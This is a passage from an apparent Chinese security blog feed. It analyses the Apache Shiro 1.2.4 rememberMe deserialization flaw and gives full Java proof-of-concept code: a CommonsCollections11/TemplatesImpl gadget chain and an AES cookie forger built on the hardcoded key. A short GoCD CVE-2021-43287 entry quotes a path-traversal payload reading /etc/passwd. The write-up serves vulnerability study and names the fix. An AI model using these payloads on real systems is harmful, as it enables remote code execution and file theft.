记录用户身份信息的功能，比较值得关注的方法为<code>getRememberedSerializedIdentity()</code>：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="type">byte</span>[] getRememberedSerializedIdentity(SubjectContext subjectContext) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!WebUtils.isHttp(subjectContext)) &#123;</span><br><span class="line">            <span class="keyword">if</span> (log.isDebugEnabled()) &#123;</span><br><span class="line">                <span class="type">String</span> <span class="variable">msg</span> <span class="operator">=</span> <span class="string">&quot;SubjectContext argument is not an HTTP-aware instance.  This is required to obtain a servlet request and response in order to retrieve the rememberMe cookie. Returning immediately and ignoring rememberMe operation.&quot;</span>;</span><br><span class="line">                log.debug(msg);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="type">WebSubjectContext</span> <span class="variable">wsc</span> <span class="operator">=</span> (WebSubjectContext)subjectContext;</span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">this</span>.isIdentityRemoved(wsc)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="type">HttpServletRequest</span> <span class="variable">request</span> <span class="operator">=</span> WebUtils.getHttpRequest(wsc);</span><br><span class="line">                <span class="type">HttpServletResponse</span> <span class="variable">response</span> <span class="operator">=</span> WebUtils.getHttpResponse(wsc);</span><br><span class="line">                <span class="type">String</span> <span class="variable">base64</span> <span class="operator">=</span> <span class="built_in">this</span>.getCookie().readValue(request, response);</span><br><span class="line">                <span class="keyword">if</span> (<span class="string">&quot;deleteMe&quot;</span>.equals(base64)) &#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> <span class="keyword">if</span> (base64 != <span class="literal">null</span>) &#123;</span><br><span class="line">                    base64 = <span class="built_in">this</span>.ensurePadding(base64);</span><br><span class="line">                    <span class="keyword">if</span> (log.isTraceEnabled()) &#123;</span><br><span class="line">                        log.trace(<span class="string">&quot;Acquired Base64 encoded identity [&quot;</span> + base64 + <span class="string">&quot;]&quot;</span>);</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    <span class="type">byte</span>[] decoded = Base64.decode(base64);</span><br><span class="line">                    <span class="keyword">if</span> (log.isTraceEnabled()) &#123;</span><br><span class="line">                        log.trace(<span class="string">&quot;Base64 decoded byte array length: &quot;</span> + (decoded != <span class="literal">null</span> ? decoded.length : <span class="number">0</span>) + <span class="string">&quot; bytes.&quot;</span>);</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">return</span> decoded;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>在该方法中，主要实现了获取 Cookie 中的内容并通过 Base64 解码，然后返回 byte 数组的功能。</p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>漏洞环境已经上传到 github 中：<a href="https://github.com/dota-st/vulnEnv">https://github.com/dota-st/vulnEnv</a></p><p>先简单了解一下该漏洞的原理：</p><p>当用户登录勾选<code>remember me</code>的时候，Shiro 会将当前用户的 Cookie 信息序列化后进行 AES 加密存储在 Cookie 的 RememberMe 字段中，在下次请求时会读取 Cookie 中的 RememberMe 字段并进行 AES 解密然后反序列化。<br><img src="images/image-20221018155429239.png" alt="image-20221018155429239"></p><p>然而通过前面的<code>AbstractRememberMeManager</code>类我们知道，AES 加解密的 KEY 是硬编码在该类中的，因此当我们知道 KEY之后，可以伪造 RememberMe 字段进而触发反序列化漏洞。</p><p>那么我们便开始一步步跟着调试吧，打上断点，在 Cookie 添加 RememberMe 字段然后发送请求。</p><p>在<code>#getRememberedPrincipals()</code>方法中将上下文数据传入到<code>getRememberedSerializedIdentity()</code>方法中<br><img src="images/image-20221018111741540.png" alt="image-20221018111741540"></p><p>接着会跳转到<code>CookieRememberMeManager#getRememberedSerializedIdentity()</code>方法中<br><img src="images/image-20221018155851444.png" alt="image-20221018155851444"></p><p>可以看到<code>readValue()</code>方法会从请求中获取<code>RememberMe</code>字段的值，最后通过<code>Base64.decode()</code>解码后返回 byte 数组，接着又回到<code>getRememberedPrincipals()</code>方法<br><img src="images/image-20221018160049461.png" alt="image-20221018160049461"></p><p>继续跟进<code>convertBytesToPrincipals()</code>方法，调用<code>decrypt()</code>方法进行解密<br><img src="images/image-20221018160159474.png" alt="image-20221018160159474"></p><p>继续跟进<code>decrypt()</code>方法<br><img src="images/image-20221018160308176.png" alt="image-20221018160308176"></p><p>这里调用到<code>getDecryptionCipherKey()</code>方法，我们跟进一下<br><img src="images/image-20221018162044495.png" alt="image-20221018162044495"></p><p>这里到了<code>AbstractRememberMeManager#getDecryptionCipherKey()</code>方法，前面我们提到过该类，在这里获取到了硬编码的秘钥。</p><p>接着<code>decrypt()</code>方法走完 return 了<code>serialized</code>字节数组，最后调用了<code>deserialize()</code>方法<br><img src="images/image-20221018162427231.png" alt="image-20221018162427231"></p><p>继续跟进<code>deserialize()</code>方法，跟着调用了<code>getSerializer().deserialize()</code>方法<br><img src="images/image-20221018162530315.png" alt="image-20221018162530315"></p><p>继续跟进<code>getSerializer().deserialize()</code>方法<br><img src="images/image-20221018162715157.png" alt="image-20221018162715157"></p><p>可以看到，这里通过<code>ByteArrayInputStream()</code>获取了输入流，最后调用<code>readObject()</code>方法进行反序列化。</p><p>回顾梳理一下流程：</p><ol><li>传入<code>RememberMe</code>字段，获取该字段的值；</li><li>对<code>RememberMe</code>进行 Base64 解码，然后调用硬编码的 KEY 进行解密；</li><li>对解密后的内容进行反序列化。</li></ol><h2 id="编写-POC"><a href="#编写-POC" class="headerlink" title="编写 POC"></a>编写 POC</h2><p>在 pom.xml 文件里添加了<code>CommonCollections</code>和<code>javassist</code>依赖，以完成反序列化的利用演示。<br><img src="images/image-20221018163306620.png" alt="image-20221018163306620"></p><p>这里通过前面我们学习的<code>CommonsCollections11</code>链子生成恶意文件<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.serialize;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassClassPath;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Created by dotast on 2022/10/12 15:50</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CommonsCollections11</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">CommonsCollections11</span> <span class="variable">commonsCollections11</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CommonsCollections11</span>();</span><br><span class="line">        commonsCollections11.serialize();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> <span class="string">&quot;Runtime.getRuntime().exec(\&quot;open -a Calculator.app\&quot;);&quot;</span>;</span><br><span class="line">        <span class="comment">// 创建evailClass</span></span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        pool.insertClassPath(<span class="keyword">new</span> <span class="title class_">ClassClassPath</span>(AbstractTranslet.class));</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">evailClass</span> <span class="operator">=</span> pool.makeClass(<span class="string">&quot;evailClass&quot;</span>);</span><br><span class="line">        <span class="comment">// 将代码插进static&#123;&#125;</span></span><br><span class="line">        evailClass.makeClassInitializer().insertBefore(cmd);</span><br><span class="line">        evailClass.setSuperclass(pool.get(AbstractTranslet.class.getName()));</span><br><span class="line">        <span class="comment">// 转换成字节码</span></span><br><span class="line">        <span class="type">byte</span>[] classBytes = evailClass.toBytecode();</span><br><span class="line">        <span class="type">byte</span>[][] targetByteCodes = <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;classBytes&#125;;</span><br><span class="line">        <span class="comment">// 反射修改</span></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> TemplatesImpl.class.newInstance();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">bytecodes</span> <span class="operator">=</span> templates.getClass().getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        bytecodes.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        bytecodes.set(templates, targetByteCodes);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">name</span> <span class="operator">=</span> templates.getClass().getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        name.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        name.set(templates, <span class="string">&quot;name&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">_class</span> <span class="operator">=</span> templates.getClass().getDeclaredField(<span class="string">&quot;_class&quot;</span>);</span><br><span class="line">        _class.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        _class.set(templates, <span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建恶意的调用链</span></span><br><span class="line">        <span class="type">InvokerTransformer</span> <span class="variable">invokerTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;toString&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>], <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> LazyMap.decorate(innerMap, invokerTransformer);</span><br><span class="line">        <span class="comment">// 创建TiedMapEntry实例</span></span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(outerMap,templates);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">expMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        expMap.put(tiedMapEntry,<span class="string">&quot;valueTest&quot;</span>);</span><br><span class="line">        outerMap.remove(templates);</span><br><span class="line">        <span class="comment">// 通过反射修改iMethodName值为newTransformer</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">f</span> <span class="operator">=</span> invokerTransformer.getClass().getDeclaredField(<span class="string">&quot;iMethodName&quot;</span>);</span><br><span class="line">        f.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        f.set(invokerTransformer, <span class="string">&quot;newTransformer&quot;</span>);</span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fileOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;1.txt&quot;</span>);</span><br><span class="line">        <span class="comment">// 创建并实例化对象输出流</span></span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fileOutputStream);</span><br><span class="line">        out.writeObject(expMap);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>根据对应的<code>AbstractRememberMeManager#encrypt()</code>方法编写加密<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.shiro;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xerces.internal.impl.dv.util.Base64;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.crypto.AesCipherService;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.util.ByteSource;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Created by dotast on 2022/10/10 10:45</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Shiro550</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">path</span> <span class="operator">=</span> <span class="string">&quot;1.txt&quot;</span>;</span><br><span class="line">        <span class="type">byte</span>[] key = Base64.decode(<span class="string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span>);</span><br><span class="line">        <span class="type">AesCipherService</span> <span class="variable">aes</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">AesCipherService</span>();</span><br><span class="line">        <span class="type">ByteSource</span> <span class="variable">ciphertext</span> <span class="operator">=</span> aes.encrypt(getBytes(path), key);</span><br><span class="line">        System.out.printf(ciphertext.toString());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] getBytes(String path) <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">InputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(path);</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> ((n=inputStream.read())!=-<span class="number">1</span>)&#123;</span><br><span class="line">            byteArrayOutputStream.write(n);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">byte</span>[] bytes = byteArrayOutputStream.toByteArray();</span><br><span class="line">        <span class="keyword">return</span> bytes;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>运行后获得构造的恶意<code>RememberMe</code>字段内容，添加到 Cookie 中发送请求，成功弹出计算器。<br><img src="images/image-20221018164755328.png" alt="image-20221018164755328"></p><h2 id="Shiro-与-CC6"><a href="#Shiro-与-CC6" class="headerlink" title="Shiro 与 CC6"></a>Shiro 与 CC6</h2><p>在<code>Commons-Collections11</code>的时候曾提过<code>Commons-Collections6</code>这条链子在 shiro 中使用会报错，但如果你用<code>Commons-Collections6</code>生成的 POC 在我上面搭的环境会发现依然能正常弹出计算器，并没有出现报错，这是为什么呢？</p><p>在上述环境使用的依赖是<code>shiro-spring</code>，也就是用 Spring-boot 构建的 Shiro<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">            &lt;groupId&gt;org.apache.shiro&lt;/groupId&gt;</span><br><span class="line">            &lt;artifactId&gt;shiro-spring&lt;/artifactId&gt;</span><br><span class="line">            &lt;version&gt;1.2.4&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure></p><p>Shiro 的原生依赖只用到了：<code>shiro-core</code>和<code>shiro-web</code>，那么<code>Spring</code>构建的<code>Shiro</code>和原生的<code>Shiro</code>有什么不同呢？</p><p>我们使用原生环境调调看，这里直接去 Shiro 的仓库下载，然后修改一下 pom.xml 文件即可，下面用到的环境也上传到前面提到的 github 仓库了。运行后访问主页，使用<code>CommonCollections6</code>的 POC 发送请求<br><img src="images/image-20221020003021727.png" alt="image-20221020003021727"></p><p>并没有弹出计算器，再回来看看 idea<br><img src="images/image-20221020003046360.png" alt="image-20221020003046360"></p><p>报错了，具体错误如下：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Caused by: org.apache.shiro.util.UnknownClassException: Unable to load class named [[Lorg.apache.commons.collections.Transformer;] from the thread context, current, or system/application ClassLoaders.  All heuristics have been exhausted.  Class could not be found.</span><br></pre></td></tr></table></figure></p><p>翻译过来大体意思就是<code>Transformer</code>类找不到，我们跟一下反序列化的入口点看看<br><img src="images/image-20221020112505932.png" alt="image-20221020112505932"></p><p>这里可以看到最后用的是<code>ClassResolvingObjectInputStream</code>类返回输入流，而不是常规的<code>ObjectInputStream</code>类，跟进该类<br><img src="images/image-20221020112940956.png" alt="image-20221020112940956"></p><p>在<code>ClassResolvingObjectInputStream</code>类中继承了<code>ObjectInputStream</code>类并且重写了<code>resolveClass()</code>方法，跟进<code>ClassUtils.forName()方法</code><img src="images/image-20221020113104243.png" alt="image-20221020113104243"><br>又继续调用了<code>loadClass()</code>方法，其中参数值为<code>[Lorg.apache.commons.collections.Transformer;</code></p><p>这里的格式是<code>JNI</code>字段描述符，<code>[</code>表示数组，<code>L</code>代表类描述符，<code>;</code>表示类名到这里结束。</p><p>接着继续跟进<code>loadClass()</code>方法<br><img src="images/image-20221020113425888.png" alt="image-20221020113425888"></p><p>可以看到这里调用的<code>ClassLoader</code>为<code>ParallerWebappClassLoader</code>，接着到<code>loadClass()</code>方法，这里接着跟进需要添加 tomcat 的源码才能继续进行调试（这里是偷懒做法，如果想食用更佳，移步<a href="../../环境&amp;其他/Tomcat源码调试/Tomcat源码调试.md">Tomcat源码调试</a>）<br><img src="images/image-20221020113701346.png" alt="image-20221020113701346"></p><p>导入 tomcat 的 jar 包之后继续跟进<code>loadClass()</code>方法进入到了<code>WebappClassLoaderBase#loadClass()</code><br><img src="images/image-20221020113737475.png" alt="image-20221020113737475"></p><p>玩下走到<code>findLoadedClass0()</code>方法<br><img src="images/image-20221021234307342.png" alt="image-20221021234307342"></p><p><code>findLoadedClass0()</code>方法去缓存中查找是否存在，从跟的结果上得到是不存在，继续往下走到<code>this.findLoadedClass()</code>方法<br><img src="images/image-20221022160745842.png" alt="image-20221022160745842"></p><p>依然为null，后面的跟着几个方法都是为 null，我们略去，到最后一步关键处，也就是到了<code>Class.forName()</code>方法<br><img src="images/image-20221020113936096.png" alt="image-20221020113936096"></p><p>这里可以看到，此时的父加载器为<code>URLClassLoader</code><br><img src="images/image-20221020114136052.png" alt="image-20221020114136052"></p><p>其中<code>ucp</code>是<code>URLClassLoader</code>类的字段，<code>ucp</code>的成员<code>path</code>是一个 ArrayList 对象，存储着类的搜索路径。而这里这些路径全都是 tomcat 下的 lib 目录文件，并没有<code>commons-collections</code>的依赖文件。</p><p>下面贴上在<code>Class.forName()</code>方法后的 debug 过程视频（因为写成文字描述过于繁琐就贴上视频）</p><p><a href="https://user-images.githubusercontent.com/72428049/197333910-de821106-9403-4708-9f25-6604bff13485.mp4">https://user-images.githubusercontent.com/72428049/197333910-de821106-9403-4708-9f25-6604bff13485.mp4</a></p><p>在 debug 视频中可以看到，传进<code>Class.forName()</code>方法的参数 name 为<code>[Lorg.apache.commons.collections.Transformer;</code>，接着后面走到<code>findLoadedClass()</code>方法时还原成了正常的<code>org.apache.commons.collections.Transformer</code>，因此有些文章在跟到前面时就断定是先前的<code>[Lorgxxx</code>格式导致无法找到的结论并不准确，这并不是最终过程。</p><p>此外，可以看到<code>ClassLoader</code>的加载过程为<code>AppClassLoader</code> —&gt; <code>ExtClassLoader</code> —&gt; <code>BootstrapClassLoa·der</code>，均搜索不到<code>org.apache.commons.collections.Transformer</code>。</p><p>搜索不到后抛出<code>ClassNotFoundException</code>的异常<br><img src="images/image-20221020114557155.png" alt="image-20221020114557155"></p><p><img src="images/image-20221020114634262.png" alt="image-20221020114634262"></p><p>因此和之前的报错对应上了，那么为什么 spring 构建的 shiro 没有报错正常弹出计算器了呢？</p><p>我们继续调试一下<br><img src="images/image-20221020114824559.png" alt="image-20221020114824559"></p><p>在该环境中，加载的<code>ClassLoader</code>为<code>TomcatEmbeddedWebappClassLoader</code>，而不是之前 shiro 原生环境的<code>ParallerWebappClassLoader</code>。</p><p>继续跟进<code>loadClass()</code>方法，跳到了<code>TomcatEmbeddedWebappClassLoader#loadClass()</code>方法<br><img src="images/image-20221020115032790.png" alt="image-20221020115032790"></p><p>继续往下走，直到<code>Class.forName()</code>方法<br><img src="images/image-20221020115153447.png" alt="image-20221020115153447"></p><p>可以看到此时的父加载器为<code>AppClassLoader</code>系统类加载器，再看看此时的 path<br><img src="images/image-20221020115615209.png" alt="image-20221020115615209"></p><p>此时的 path 不再是 tomcat 下的，而是 java 环境中的，包含了<code>commons-collections</code>依赖，因此可以成功加载到<br><img src="images/image-20221020115831830.png" alt="image-20221020115831830"></p><p>这也解释了为什么在 spring 构建的 Shiro 环境中<code>Commons-Collections6</code>可以打成功，而原生的 Shiro 环境却报错失败的情况。</p><p>至于为什么 path 会不一样，父类加载器也不一样，尝试跟了一下，实在过于复杂，遂暂时放弃，调试到此。</p><p>等哪一天知识储备足够了，再来解惑。</p><h2 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><p>在 Shiro 1.2.5 版本的更新中，用户需要手动配置 CipherKey，如果不设置，将会动态生成一个 CipherKey。但反序列化流程没有修改，这也是 Shiro 至今依然在各大 HW 演练中频繁出现的原因。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>CVE 2021 43287</title>
      <link href="/2022/11/10/CVE-2021-43287/"/>
      <url>/2022/11/10/CVE-2021-43287/</url>
      
        <content type="html"><![CDATA[<h1 id="CVE-2021-43287"><a href="#CVE-2021-43287" class="headerlink" title="CVE 2021 43287"></a>CVE 2021 43287</h1><blockquote><p>GoCD 一款先进的持续集成和发布管理系统,由ThoughtWorks开发。（不要和Google的编程语言Go混淆了！）其前身为CruiseControl,是ThoughtWorks在做咨询和交付交付项目时自己开发的一款开源的持续集成工具。后来随着持续集成及持续部署的火热，ThoughtWorks专门成立了一个项目组，基于Cruise开发除了Go这款工具。ThoughtWorks开源持续交付工具Go。使用Go来建立起一个项目的持续部署pipeline是非常快的，非常方便。 GoCD的v20.6.0 - v21.2.0版本存在任意文件读取漏洞，可以通过/go/add-on/business-continuity/api/plugin?folderName=&amp;pluginName=../../../etc/passwd 对文件进行读取。</p></blockquote><h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">v20.6.0 - v21.2.0</span><br></pre></td></tr></table></figure><h2 id="漏洞点"><a href="#漏洞点" class="headerlink" title="漏洞点"></a>漏洞点</h2><p><img src="https://user-images.githubusercontent.com/63966847/149621578-1249eeb8-f454-48ac-8edc-c5385a69661d.png" alt="image-20220115201323862"></p><h2 id="演示"><a href="#演示" class="headerlink" title="演示"></a>演示</h2><p><img src="https://user-images.githubusercontent.com/63966847/149621580-174d710e-5900-4860-b877-6a67f115c13c.png" alt="image-20220115201231569"></p><h2 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h2><p><a href="https://github.com/gocd/gocd/commit/41abc210ac4e8cfa184483c9ff1c0cc04fb3511c#diff-cc02ae4dc975bd7648bbbff5f5a2d98867674a767acc35c99d4cfd4d5a6fe488">https://github.com/gocd/gocd/commit/41abc210ac4e8cfa184483c9ff1c0cc04fb3511c#diff-cc02ae4dc975bd7648bbbff5f5a2d98867674a767acc35c99d4cfd4d5a6fe488</a></p><p><img src="https://user-images.githubusercontent.com/63966847/149621583-5334295f-a207-4da9-b5ad-1182bacf76d2.png" alt="image-20220115201143857"></p><p>删除了路由。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2021-45456 Apache Kylin 命令注入</title>
      <link href="/2022/11/10/CVE-2021-45456ApacheKylin%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E5%88%86%E6%9E%90%E8%A1%A5%E5%85%85/"/>
      <url>/2022/11/10/CVE-2021-45456ApacheKylin%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E5%88%86%E6%9E%90%E8%A1%A5%E5%85%85/</url>
      
